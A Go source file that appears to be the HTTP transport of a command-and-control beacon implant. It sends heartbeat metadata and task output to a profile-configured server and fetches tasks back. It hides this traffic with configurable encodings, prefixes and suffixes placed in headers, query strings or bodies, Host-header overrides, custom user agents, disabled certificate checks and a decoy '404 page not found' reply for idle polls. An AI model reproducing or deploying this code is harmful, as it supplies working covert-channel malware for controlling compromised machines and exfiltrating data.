package http

import (
	"beacon/pkg/profile"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	nethttp "net/http"
	"strings"
	"time"
)

type HttpClient struct {
	client *nethttp.Client
}

type transformHeader struct {
	name  string
	value []byte
}

type transformRequest struct {
	method      string
	headers     []transformHeader
	body        []byte
	contentType string
	queryName   string
	queryValue  []byte
}

func NewHttpClient() *HttpClient {
	return &HttpClient{
		client: &nethttp.Client{
			Timeout: profile.GlobalProfile.ConnTimeout,
			Transport: &nethttp.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
			},
		},
	}
}

func (h *HttpClient) Exchange(metadata []byte, payload []byte) ([]byte, error) {
	return h.SendData(metadata, payload)
}

func (h *HttpClient) SendData(metadata []byte, payload []byte) ([]byte, error) {
	reconnectCount := profile.GlobalProfile.HTTP.ReconnectCount
	if reconnectCount < 0 {
		reconnectCount = 0
	}
	reconnectDelay := time.Duration(profile.GlobalProfile.HTTP.ReconnectTime) * time.Millisecond

	var lastErr error
	for attempt := 0; attempt <= reconnectCount; attempt++ {
		var (
			resBody []byte
			err     error
		)

		if profile.GlobalProfile.HTTP.Transform.Present {
			resBody, err = h.sendTransformOnce(metadata, payload)
		} else {
			resBody, err = h.sendLegacyOnce(metadata, payload)
		}
		if err == nil {
			return resBody, nil
		}

		lastErr = err
		if attempt < reconnectCount && reconnectDelay > 0 {
			time.Sleep(reconnectDelay)
		}
	}

	return nil, lastErr
}

func (h *HttpClient) sendTransformOnce(metadata []byte, payload []byte) ([]byte, error) {
	method, methodName, ok := selectTransformMethod(profile.GlobalProfile.HTTP.Transform, len(payload) > 0, profile.GlobalProfile.HTTP.Method)
	if !ok {
		return nil, fmt.Errorf("http transform unavailable for method %q", profile.GlobalProfile.HTTP.Method)
	}

	req, err := buildTransformRequest(method, methodName, metadata, payload)
	if err != nil {
		return nil, err
	}

	response, err := h.doTransformRequest(req)
	if err != nil {
		return nil, err
	}
	if isNoTaskHTTPBody(response) {
		return nil, nil
	}

	return transformDecode(&method.ServerOutput, response)
}

func isNoTaskHTTPBody(response []byte) bool {
	return len(response) == 0 || string(response) == "404 page not found"
}

func selectTransformMethod(transform profile.HTTPTransformConfig, hasResult bool, configuredMethod string) (profile.HTTPMethodTransform, string, bool) {
	if !transform.Present || transform.Version != 1 {
		return profile.HTTPMethodTransform{}, "", false
	}

	if strings.EqualFold(configuredMethod, "GET") {
		if transformMethodUsable(transform.Get, hasResult) {
			return transform.Get, "GET", true
		}
		return profile.HTTPMethodTransform{}, "", false
	}
	if strings.EqualFold(configuredMethod, "POST") {
		if transformMethodUsable(transform.Post, hasResult) {
			return transform.Post, "POST", true
		}
		return profile.HTTPMethodTransform{}, "", false
	}

	if hasResult {
		if transformMethodUsable(transform.Post, true) {
			return transform.Post, "POST", true
		}
		if transformMethodUsable(transform.Get, true) {
			return transform.Get, "GET", true
		}
	} else {
		if transformMethodUsable(transform.Get, false) {
			return transform.Get, "GET", true
		}
		if transformMethodUsable(transform.Post, false) {
			return transform.Post, "POST", true
		}
	}

	return profile.HTTPMethodTransform{}, "", false
}

func transformMethodUsable(method profile.HTTPMethodTransform, hasResult bool) bool {
	if !method.Metadata.Present || !method.ServerOutput.Present {
		return false
	}
	if hasResult && !method.StageOutput.Present {
		return false
	}
	return true
}

func buildTransformRequest(method profile.HTTPMethodTransform, methodName string, metadata []byte, payload []byte) (transformRequest, error) {
	req := transformRequest{method: methodName}
	if len(metadata) == 0 {
		return req, fmt.Errorf("missing heartbeat metadata")
	}
	if err := applyTransformInput(&req, &method.Metadata, metadata); err != nil {
		return req, err
	}
	if len(payload) > 0 {
		if err := applyTransformInput(&req, &method.StageOutput, payload); err != nil {
			return req, err
		}
	}
	return req, nil
}

func applyTransformInput(req *transformRequest, spec *profile.HTTPDataTransform, input []byte) error {
	wire, err := transformEncode(spec, input)
	if err != nil {
		return err
	}

	switch spec.Location {
	case 1:
		if len(req.body) > 0 {
			return fmt.Errorf("duplicate transform body input")
		}
		req.body = wire
		req.contentType = transformBodyContentType(spec.OutputMode)
		return nil
	case 2:
		if spec.Name == "" {
			return fmt.Errorf("transform header name is empty")
		}
		req.headers = append(req.headers, transformHeader{name: spec.Name, value: wire})
		return nil
	case 3:
		if spec.Name == "" {
			return fmt.Errorf("transform query name is empty")
		}
		if req.queryName != "" {
			return fmt.Errorf("duplicate transform query input")
		}
		req.queryName = spec.Name
		req.queryValue = wire
		return nil
	default:
		return fmt.Errorf("unsupported transform location: %d", spec.Location)
	}
}

func transformEncode(spec *profile.HTTPDataTransform, input []byte) ([]byte, error) {
	if spec == nil || !spec.Present {
		return nil, fmt.Errorf("transform input is absent")
	}

	var encoded []byte
	switch spec.Encoding {
	case 1:
		encoded = append([]byte(nil), input...)
	case 2:
		encoded = []byte(base64.StdEncoding.EncodeToString(input))
	case 3:
		encoded = []byte(base64.RawURLEncoding.EncodeToString(input))
	default:
		return nil, fmt.Errorf("unsupported transform encoding: %d", spec.Encoding)
	}

	out := make([]byte, 0, len(spec.Prefix)+len(encoded)+len(spec.Suffix))
	out = append(out, spec.Prefix...)
	out = append(out, encoded...)
	out = append(out, spec.Suffix...)
	return out, nil
}

func transformDecode(spec *profile.HTTPDataTransform, wire []byte) ([]byte, error) {
	if spec == nil || !spec.Present {
		return nil, fmt.Errorf("transform output is absent")
	}

	data := wire
	if spec.Prefix != "" {
		prefix := []byte(spec.Prefix)
		if len(data) < len(prefix) || !bytes.Equal(data[:len(prefix)], prefix) {
			return nil, fmt.Errorf("transform prefix mismatch")
		}
		data = data[len(prefix):]
	}
	if spec.Suffix != "" {
		suffix := []byte(spec.Suffix)
		if len(data) < len(suffix) || !bytes.Equal(data[len(data)-len(suffix):], suffix) {
			return nil, fmt.Errorf("transform suffix mismatch")
		}
		data = data[:len(data)-len(suffix)]
	}

	switch spec.Encoding {
	case 1:
		return append([]byte(nil), data...), nil
	case 2:
		return decodeStdBase64(data)
	case 3:
		return decodeURLBase64(data)
	default:
		return nil, fmt.Errorf("unsupported transform encoding: %d", spec.Encoding)
	}
}

func decodeStdBase64(data []byte) ([]byte, error) {
	s := string(data)
	if out, err := base64.StdEncoding.DecodeString(s); err == nil {
		return out, nil
	}
	if out, err := base64.RawStdEncoding.DecodeString(s); err == nil {
		return out, nil
	}

	padded := s
	if rem := len(padded) % 4; rem != 0 {
		padded += strings.Repeat("=", 4-rem)
	}
	return base64.StdEncoding.DecodeString(padded)
}

func decodeURLBase64(data []byte) ([]byte, error) {
	s := string(data)
	if out, err := base64.RawURLEncoding.DecodeString(s); err == nil {
		return out, nil
	}
	if out, err := base64.URLEncoding.DecodeString(s); err == nil {
		return out, nil
	}

	padded := s
	if rem := len(padded) % 4; rem != 0 {
		padded += strings.Repeat("=", 4-rem)
	}
	return base64.URLEncoding.DecodeString(padded)
}

func transformBodyContentType(outputMode uint8) string {
	if outputMode == 2 {
		return "text/plain; charset=utf-8"
	}
	return "application/octet-stream"
}

func (h *HttpClient) doTransformRequest(req transformRequest) ([]byte, error) {
	url := profile.GlobalProfile.GetUrl()
	if req.queryName != "" {
		sep := "?"
		if strings.Contains(url, "?") {
			sep = "&"
		}
		url = url + sep + urlEncodeBytes([]byte(req.queryName)) + "=" + urlEncodeBytes(req.queryValue)
	}

	var body io.Reader
	if len(req.body) > 0 {
		body = bytes.NewReader(req.body)
	}

	request, err := nethttp.NewRequest(req.method, url, body)
	if err != nil {
		return nil, err
	}

	if req.contentType != "" {
		request.Header.Set("Content-Type", req.contentType)
	}
	if hostHeader := profile.GlobalProfile.HTTP.HostHeader; hostHeader != "" {
		request.Host = hostHeader
	}
	if ua := profile.GlobalProfile.HTTP.UserAgent; ua != "" {
		request.Header.Set("User-Agent", ua)
	}
	for _, header := range req.headers {
		request.Header.Set(header.name, string(header.value))
	}

	resp, err := h.client.Do(request)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func urlEncodeBytes(data []byte) string {
	const hex = "0123456789ABCDEF"
	if len(data) == 0 {
		return ""
	}

	var b strings.Builder
	b.Grow(len(data) * 3)
	for _, c := range data {
		if isURLUnreserved(c) {
			b.WriteByte(c)
			continue
		}
		b.WriteByte('%')
		b.WriteByte(hex[(c>>4)&0x0f])
		b.WriteByte(hex[c&0x0f])
	}
	return b.String()
}

func isURLUnreserved(c byte) bool {
	return (c >= 'A' && c <= 'Z') ||
		(c >= 'a' && c <= 'z') ||
		(c >= '0' && c <= '9') ||
		c == '-' || c == '_' || c == '.' || c == '~'
}

func (h *HttpClient) sendLegacyOnce(metadata []byte, payload []byte) ([]byte, error) {
	var requestBody io.Reader
	if len(payload) > 0 {
		requestBody = bytes.NewBuffer(payload)
	}

	method := profile.GlobalProfile.HTTP.Method
	if method == "" {
		method = "GET"
	}

	req, err := nethttp.NewRequest(method, profile.GlobalProfile.GetUrl(), requestBody)
	if err != nil {
		return nil, err
	}

	if len(metadata) > 0 {
		encodedMetadata := base64.RawURLEncoding.EncodeToString(metadata)
		req.Header.Set(profile.GlobalProfile.HTTP.HBHeader, profile.GlobalProfile.HTTP.HBPrefix+encodedMetadata)
	}

	contentType := profile.GlobalProfile.HTTP.ContentType
	if contentType == "" {
		contentType = "application/octet-stream"
	}
	req.Header.Set("Content-Type", contentType)

	if hostHeader := profile.GlobalProfile.HTTP.HostHeader; hostHeader != "" {
		req.Host = hostHeader
	}
	if ua := profile.GlobalProfile.HTTP.UserAgent; ua != "" {
		req.Header.Set("User-Agent", ua)
	}

	resp, err := h.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}
